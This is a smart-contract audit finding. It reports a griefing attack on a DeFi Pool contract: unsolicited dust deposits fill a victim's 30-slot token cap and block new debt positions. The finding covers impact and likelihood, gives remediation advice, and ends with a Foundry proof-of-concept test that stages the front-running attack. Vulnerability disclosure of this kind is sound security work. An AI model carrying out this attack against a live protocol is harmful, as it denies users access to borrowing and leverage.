### Title
Unprivileged dust deposits can DoS new debt positions by saturating `MAX_TOKENS_PER_USER` - ([contracts/Pool.sol](contracts/Pool.sol))

### Summary

`Pool` tracks each account's active deposit and debt token types in bounded enumerable sets and rejects any addition once their combined length reaches `MAX_TOKENS_PER_USER`, which is fixed at 30. [1](#0-0) [2](#0-1) 

An attacker can increase a victim's deposit-token count without consent because `DepositToken.deposit()` accepts an arbitrary `onBehalfOf_` recipient and mints the receipt token to that address. [3](#0-2)  When the recipient did not previously hold that deposit token, `_mint()` registers it through `Pool.addToDepositTokensOfAccount()`. [4](#0-3) 

Once the victim is at the cap, opening a previously unused debt position reverts because `DebtToken._mint()` calls `Pool.addToDebtTokensOfAccount()`, which applies the same combined limit. [5](#0-4) [6](#0-5) 

### Finding Description

`Pool.addToDepositTokensOfAccount()` and `Pool.addToDebtTokensOfAccount()` both use `onlyIfAdditionWillNotReachMaxTokens`, which reverts when `debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= 30`. [2](#0-1) [7](#0-6) 

There is no recipient authorization or minimum economic size for a deposit-token registration. An attacker can therefore front-run a victim's first borrow or leveraged position and send a small deposit on the victim's behalf through a registered `DepositToken`. [3](#0-2) 

For example, a victim with 29 tracked token types submits `DebtToken.issue(amount, victim)`. Before that transaction executes, the attacker deposits enough collateral in a deposit token absent from the victim's set to mint a nonzero balance to the victim. The victim then reaches 30 tracked token types, and the borrow reverts with `UserReachedMaxTokens` when `DebtToken._mint()` attempts to add the new debt token. [8](#0-7) [9](#0-8) 

The same saturation also blocks `SmartFarmingManager.leverage()` for an unused debt token because it calls `_debtToken.mint(_msgSender, _debtAmount)`, which routes through `DebtToken._mint()` and the capped pool set. [10](#0-9) 

### Impact Explanation

The victim temporarily loses the ability to open a debt position in any debt token that is not already in `debtTokensOfAccount`. [11](#0-10)  This includes direct issuance through `DebtToken.issue()` and leveraged positions through `SmartFarmingManager.leverage()`. [12](#0-11) 

The victim can free a slot only by fully reducing one tracked deposit or debt balance to zero so the corresponding token is removed from the account set. [13](#0-12) [14](#0-13)  An attacker that monitors the mempool can repeat the dust deposit whenever a slot is freed.

### Likelihood Explanation

Likelihood is conditional rather than universal. The attack requires enough registered deposit-token types not already tracked for the victim to push the combined account set to 30, or requires the victim to already occupy a large number of slots. It also costs the attacker gas and irrevocably transfers the deposited collateral to the victim. No privileged role, incorrect oracle state, malicious gateway, or governance action is needed for the attack transaction itself.

### Recommendation

Require a minimum initial deposit amount before adding a token to an account's tracked set, or allow recipients to reject unsolicited new-position deposits. Another option is to provide an explicit cleanup path that returns unsolicited dust to the payer and removes the token from the victim's set without exposing the victim to a repeated front-running loop. The pool should also avoid charging the victim an account-list slot for economically immaterial balances, while ensuring that material collateral remains included in `depositOf()` and `debtPositionOf()`. [15](#0-14)

// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IDebtToken} from "../contracts/interfaces/IDebtToken.sol";
import {ISyntheticToken} from "../contracts/interfaces/ISyntheticToken.sol";

contract MaxTokenSlotGriefingTest is Test {
    IPool pool = IPool(/* deployed Pool */);
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function test_dustDepositBlocksFirstDebtMint() public {
        address[] memory depositTokens = pool.getDepositTokens();

        // Setup precondition: the victim has 29 tracked deposit/debt token types
        // and sufficient collateral to pass DebtToken.issue()'s health checks.
        assertEq(
            pool.getDepositTokensOfAccount(victim).length +
                pool.getDebtTokensOfAccount(victim).length,
            29
        );

        // Select a registered deposit token absent from the victim's set.
        IDepositToken dustToken;
        for (uint256 i; i < depositTokens.length; ++i) {
            IDepositToken candidate = IDepositToken(depositTokens[i]);
            if (candidate.balanceOf(victim) == 0) {
                dustToken = candidate;
                break;
            }
        }
        require(address(dustToken) != address(0), "no unused deposit token");

        // The attacker deposits the smallest economically nonzero amount
        // directly on behalf of the victim.
        IERC20 underlying = dustToken.underlying();
        (uint256 grossAmount, ) = dustToken.quoteDepositIn(1);
        deal(address(underlying), attacker, grossAmount, true);

        vm.startPrank(attacker);
        underlying.approve(address(dustToken), grossAmount);
        dustToken.deposit(grossAmount, victim);
        vm.stopPrank();

        assertEq(
            pool.getDepositTokensOfAccount(victim).length +
                pool.getDebtTokensOfAccount(victim).length,
            30
        );

        // Select a debt token absent from the victim's debt set.
        address[] memory debtTokens = pool.getDebtTokens();
        IDebtToken newDebtToken;
        for (uint256 i; i < debtTokens.length; ++i) {
            IDebtToken candidate = IDebtToken(debtTokens[i]);
            if (candidate.balanceOf(victim) == 0) {
                newDebtToken = candidate;
                break;
            }
        }
        require(address(newDebtToken) != address(0), "no unused debt token");

        uint256 borrowAmount = /* amount above debtFloor and within collateral */;
        ISyntheticToken synthetic = newDebtToken.syntheticToken();

        // Without the unsolicited dust deposit this would create the victim's
        // first balance in `newDebtToken`; at the cap it reverts.
        vm.expectRevert(bytes4(keccak256("UserReachedMaxTokens()")));
        vm.prank(victim);
        newDebtToken.issue(borrowAmount, victim);

        assertEq(newDebtToken.balanceOf(victim), 0);
        assertEq(synthetic.balanceOf(victim), 0);
    }
}
